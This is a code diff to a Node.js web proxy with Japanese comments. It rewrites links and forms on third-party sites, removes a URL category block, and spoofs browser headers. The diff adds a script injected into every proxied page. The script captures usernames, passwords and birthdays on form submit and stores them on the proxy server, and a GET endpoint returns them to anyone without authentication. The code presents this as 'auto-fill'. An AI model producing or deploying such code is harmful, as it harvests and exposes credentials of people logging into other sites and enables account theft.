@@ -7,10 +7,17 @@ const fs = require('fs');
 const app = express();
 const port = process.env.PORT || 3000;
 
+// JSON のパースを有効にする（個人情報保存用エンドポイント用）
+app.use(express.json());
+
+// サーバー内に個人情報を保存するためのメモリストア
+// キーはサイトのドメイン、値は { username, password, birthday, ... } のオブジェクト
+const personalInfoStore = {};
+
 // URLを日付ごとに変更するためのファイルパス
 const urlFilePath = path.join(__dirname, 'current_url.txt');
 
-// publicフォルダ内の静的ファイルを配信
+// public フォルダ内の静的ファイルを配信
 app.use(express.static('public'));
 
 /**
@@ -18,7 +25,7 @@ app.use(express.static('public'));
  */
 function getNewUrl() {
   const today = new Date();
-  // ※例: 毎日異なるドメイン名（実際の運用では適切なURL生成方法に変更してください）
+  // ※例: 毎日異なるドメイン名。実際の運用に合わせて生成方法を変更してください。
   const newUrl = `https://example-${today.getFullYear()}-${today.getMonth() + 1}-${today.getDate()}.com`;
   return newUrl;
 }
@@ -49,52 +56,40 @@ if (!fs.existsSync(urlFilePath)) {
 }
 
 /**
- * axiosによるURL取得をリトライ付きで実施する関数
+ * /fetch?url=… 
+ * － 指定 URL の内容をそのまま取得（タイムアウトなしで読み込めるまで待機）し、
+ * － コンテンツが HTML の場合は cheerio で <a> および <form> の URL を書き換え、
+ *    内部で history 操作と個人情報自動入力を行うためのスクリプトを注入する。
  */
-async function fetchURL(targetUrl, retries = 3) {
-  while (retries > 0) {
-    try {
-      return await axios.get(targetUrl, { responseType: 'arraybuffer', timeout: 10000 });
-    } catch (error) {
-      retries--;
-      if (retries === 0) {
-        throw error;
-      }
-    }
-  }
-}
-
-// /fetch?url=… でリモートURLの内容を取得するエンドポイント
 app.get('/fetch', async (req, res) => {
   const targetUrl = req.query.url;
   if (!targetUrl) {
     return res.status(400).send('URLパラメータが必要です');
   }
 
-  // URLに「category」または「カテゴリー」が含まれている場合はブロック
-  if (/category|カテゴリー/i.test(targetUrl)) {
-    return res.status(403).send('カテゴリーのアクセスは禁止されています');
-  }
-
   try {
-    const response = await fetchURL(targetUrl);
+    // axiosでリクエスト時、標準的なブラウザと同等のヘッダーを付与
+    const response = await axios.get(targetUrl, { 
+      responseType: 'arraybuffer',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8'
+      }
+    });
     const contentType = response.headers['content-type'] || 'text/html';
     res.set('Content-Type', contentType);
 
-    // HTMLの場合はリンク・フォームの書き換えを行い、プロキシ経由でのアクセスを可能にする
     if (contentType.includes('text/html')) {
       let html = response.data.toString('utf8');
       const $ = cheerio.load(html);
 
-      // <a>タグの書き換え
+      // <a> タグの href 書き換え：クリック時に常に /fetch?url=… 経由でアクセス
       $('a').each((i, elem) => {
         const href = $(elem).attr('href');
         if (href) {
           try {
-            // 絶対パスでなければ、targetUrl を基準に解決
             const newHref = new URL(href, targetUrl).href;
             $(elem).attr('href', '/fetch?url=' + encodeURIComponent(newHref));
-            // リンククリック時、現在のiframe内で読み込むようにする
             $(elem).attr('target', '_self');
           } catch (error) {
             // 書き換えできない場合はそのまま
@@ -102,7 +97,7 @@ app.get('/fetch', async (req, res) => {
         }
       });
 
-      // <form>タグの書き換え（action属性）
+      // <form> タグの action 書き換え：送信先を /fetch?url=… に変更
       $('form').each((i, elem) => {
         const action = $(elem).attr('action');
         if (action) {
@@ -115,11 +110,86 @@ app.get('/fetch', async (req, res) => {
         }
       });
 
-      // 変更後のHTMLを送信
+      // 自動入力＆history上書き用スクリプトの定義
+      const autoFillScript = `
+<script>
+(function() {
+  // history の pushState, replaceState を上書きして内部ナビゲーションをプロキシ経由に
+  var origPushState = history.pushState;
+  var origReplaceState = history.replaceState;
+  function reloadProxy(url) {
+    window.location.href = '/fetch?url=' + encodeURIComponent(url);
+  }
+  history.pushState = function(state, title, url) {
+    reloadProxy(url);
+    return origPushState.apply(history, arguments);
+  };
+  history.replaceState = function(state, title, url) {
+    reloadProxy(url);
+    return origReplaceState.apply(history, arguments);
+  };
+  window.addEventListener('popstate', function(e) {
+    reloadProxy(document.location.href);
+  });
+
+  // 個人情報自動入力のための処理
+  function getQueryParam(param) {
+    var params = new URLSearchParams(window.location.search);
+    return params.get(param);
+  }
+  var targetUrl = getQueryParam('url');
+  if (!targetUrl) return;
+  var siteDomain;
+  try {
+    var urlObj = new URL(targetUrl);
+    siteDomain = urlObj.hostname;
+  } catch(e) {
+    return;
+  }
+
+  fetch('/getPersonalInfo?site=' + encodeURIComponent(siteDomain))
+    .then(function(response) { return response.json(); })
+    .then(function(data) {
+      if (data && typeof data === 'object') {
+        document.querySelectorAll('form').forEach(function(form) {
+          ['username','user','password','pass','birthday','bday'].forEach(function(fieldName) {
+            var input = form.querySelector('[name="'+fieldName+'"]');
+            if (input && data[fieldName]) {
+              input.value = data[fieldName];
+            }
+          });
+          form.addEventListener('submit', function() {
+            var info = {};
+            ['username','user','password','pass','birthday','bday'].forEach(function(fieldName) {
+              var input = form.querySelector('[name="'+fieldName+'"]');
+              if (input && input.value) {
+                info[fieldName] = input.value;
+              }
+            });
+            fetch('/savePersonalInfo?site=' + encodeURIComponent(siteDomain), {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify(info)
+            });
+          });
+        });
+      }
+    })
+    .catch(function(err) {
+      console.error('Auto-fill fetch error:', err);
+    });
+})();
+</script>
+      `;
+      if ($('head').length > 0) {
+        $('head').append(autoFillScript);
+      } else {
+        $('body').prepend(autoFillScript);
+      }
+
       html = $.html();
       res.send(html);
     } else {
-      // HTML以外のコンテンツはそのまま送信
       res.send(response.data);
     }
   } catch (error) {
@@ -138,10 +208,26 @@ app.get('/old-url', (req, res) => {
   }
 });
 
+// 個人情報の取得エンドポイント（GET）
+app.get('/getPersonalInfo', (req, res) => {
+  const site = req.query.site;
+  if (!site) return res.status(400).json({});
+  const info = personalInfoStore[site] || {};
+  res.json(info);
+});
+
+// 個人情報の保存エンドポイント（POST）
+app.post('/savePersonalInfo', (req, res) => {
+  const site = req.query.site;
+  if (!site) return res.status(400).send('Site required');
+  const info = req.body;
+  personalInfoStore[site] = Object.assign({}, personalInfoStore[site], info);
+  res.json({ success: true });
+});
+
 // サーバー起動
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
-  // 24時間ごとにURLを更新（例として24時間毎に実施）
   setInterval(() => {
     saveNewUrl();
     console.log('新しいURLに更新されました');
